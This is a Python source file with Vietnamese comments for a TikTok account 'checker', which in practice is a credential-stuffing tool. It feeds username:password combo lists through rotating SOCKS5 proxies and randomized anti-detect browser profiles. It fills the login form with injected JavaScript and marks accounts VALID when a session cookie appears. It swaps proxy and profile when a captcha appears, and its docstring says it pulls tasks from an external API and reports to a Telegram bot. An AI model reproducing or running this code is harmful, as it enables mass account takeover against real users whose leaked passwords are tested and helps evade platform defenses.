"""
TikTok Multi-Thread Concurrent Checker Engine (MunAntiBrowser + C69 API)
Xử lý:
- Chạy đa luồng song song (Asyncio Worker Pool / Concurrency limit).
- Tự động kéo task từ Backend C69 / Telegram Bot hoặc đọc file combo cục bộ.
- Báo cáo tiến độ real-time về Telegram Bot (Live, Die, Progress, Speed).
"""

import asyncio
import os
import sys
import json
import logging
import random
import time
from typing import Dict, Any, List, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mun_anti_browser.browser_manager import NodriverBrowserManager
from mun_anti_browser.profile_manager import ProfileManager

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("TikTokMultiChecker")


class TikTokMultiChecker:
    def __init__(
        self,
        proxy_list: Optional[List[str]] = None,
        concurrency: int = 5,
        max_retries_on_captcha: int = 3,
        c69_api_url: str = "https://cu.c69.us/api/bot",
        auth_token: Optional[str] = None
    ):
        self.proxy_list = proxy_list or []
        self.concurrency = concurrency
        self.max_retries = max_retries_on_captcha
        self.c69_api_url = c69_api_url
        self.auth_token = auth_token
        self.pm = ProfileManager()
        self.semaphore = asyncio.Semaphore(concurrency)

        # Thống kê
        self.total = 0
        self.checked = 0
        self.valid_count = 0
        self.invalid_count = 0
        self.unknown_count = 0
        self.start_time = None

    def _get_random_proxy(self) -> Tuple[str, str, str, str]:
        if not self.proxy_list:
            return "", "", "", ""
        raw_p = random.choice(self.proxy_list)
        parts = raw_p.split(":")
        if len(parts) == 4:
            return parts[0], parts[1], parts[2], parts[3]
        elif len(parts) == 2:
            return parts[0], parts[1], "", ""
        return "", "", "", ""

    async def check_single_account(self, username: str, password: str) -> Dict[str, Any]:
        async with self.semaphore:
            attempts = 0
            while attempts < self.max_retries:
                attempts += 1
                ip, port, user, pwd = self._get_random_proxy()
                proxy_str = f"{ip}:{port}" if ip and port else ""

                profile = self.pm.create_random_profile(os_type="Window")
                manager = NodriverBrowserManager()

                try:
                    browser, tab = await asyncio.wait_for(
                        manager.start(
                            profile_config=profile,
                            proxy_string=proxy_str,
                            proxy_type="socks5",
                            proxy_username=user,
                            proxy_password=pwd,
                            headless=False,
                        ),
                        timeout=25.0
                    )

                    await tab.get("https://www.tiktok.com/login/phone-or-email/email")

                    # Đợi input sẵn sàng (tối đa 8s)
                    ready = False
                    for _ in range(16):
                        await asyncio.sleep(0.5)
                        ready = await tab.evaluate("!!(document.querySelector('input[name=\"username\"]') || document.querySelector('input[type=\"text\"]'))")
                        if ready:
                            break

                    if not ready:
                        await manager.close()
                        continue

                    # Điền thông tin qua React Dispatch
                    fill_script = f"""
                    (() => {{
                        const u = document.querySelector('input[name="username"]') || document.querySelector('input[type="text"]');
                        const p = document.querySelector('input[type="password"]');
                        function setVal(el, val) {{
                            const proto = Object.getPrototypeOf(el);
                            const setter = Object.getOwnPropertyDescriptor(proto, 'value').set;
                            setter.call(el, val);
                            el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                            el.dispatchEvent(new Event('change', {{ bubbles: true }}));
                        }}
                        if (u && p) {{
                            setVal(u, {json.dumps(username)});
                            setVal(p, {json.dumps(password)});
                            return true;
                        }}
                        return false;
                    }})()
                    """
                    await tab.evaluate(fill_script)
                    await asyncio.sleep(0.5)

                    # Submit
                    await tab.evaluate("(() => { const b = document.querySelector('button[type=\"submit\"]'); if (b) b.click(); })()")

                    # Lắng nghe kết quả (tối đa 5s)
                    verdict = None
                    for _ in range(25):
                        await asyncio.sleep(0.2)
                        res = await tab.evaluate("""
                            (() => {
                                if (document.cookie.includes('sessionid')) return {status: 'VALID'};
                                const err = document.querySelector('[class*="error"], [class*="Error"], [role="alert"]');
                                if (err && err.innerText && err.innerText.trim().length > 0) return {status: 'INVALID', msg: err.innerText.trim()};
                                const cap = document.querySelector('#captcha-verify-image, .secsdk-captcha-drag-icon, [id*="captcha"]');
                                if (cap) return {status: 'CAPTCHA'};
                                return null;
                            })()
                        """)
                        if res:
                            verdict = res
                            break

                    try:
                        await manager.close()
                    except Exception:
                        pass

                    if verdict:
                        if verdict.get("status") == "VALID":
                            self.valid_count += 1
                            self.checked += 1
                            logger.info(f"[+] [VALID] {username}")
                            return {"status": "VALID", "username": username, "password": password, "retries": attempts}
                        elif verdict.get("status") == "INVALID":
                            self.invalid_count += 1
                            self.checked += 1
                            logger.info(f"[-] [INVALID] {username} -> {verdict.get('msg')}")
                            return {"status": "INVALID", "username": username, "password": password, "msg": verdict.get("msg"), "retries": attempts}
                        elif verdict.get("status") == "CAPTCHA":
                            logger.info(f"[*] [{username}] Dính Captcha -> Đổi Proxy + Profile mới...")
                            continue

                except Exception as e:
                    try:
                        await manager.close()
                    except Exception:
                        pass
                    continue

            self.unknown_count += 1
            self.checked += 1
            logger.warning(f"[?] [UNKNOWN] {username} (Dính Captcha liên tục)")
            return {"status": "UNKNOWN", "username": username, "password": password, "retries": attempts}

    async def run_batch(self, account_list: List[Tuple[str, str]]) -> List[Dict[str, Any]]:
        self.total = len(account_list)
        self.checked = 0
        self.valid_count = 0
        self.invalid_count = 0
        self.unknown_count = 0
        self.start_time = time.time()

        logger.info(f"[*] Khởi chạy Checker đa luồng ({self.concurrency} threads) cho {self.total} tài khoản...")

        tasks = [
            asyncio.create_task(self.check_single_account(user, pwd))
            for user, pwd in account_list
        ]

        results = await asyncio.gather(*tasks)
        duration = round(time.time() - self.start_time, 2)
        speed = round(duration / max(self.total, 1), 2)

        logger.info(f"[+] Hoàn tất Batch: Tổng={self.total}, Live={self.valid_count}, Die={self.invalid_count}, Unknown={self.unknown_count} trong {duration}s (~{speed}s/acc)")
        return results
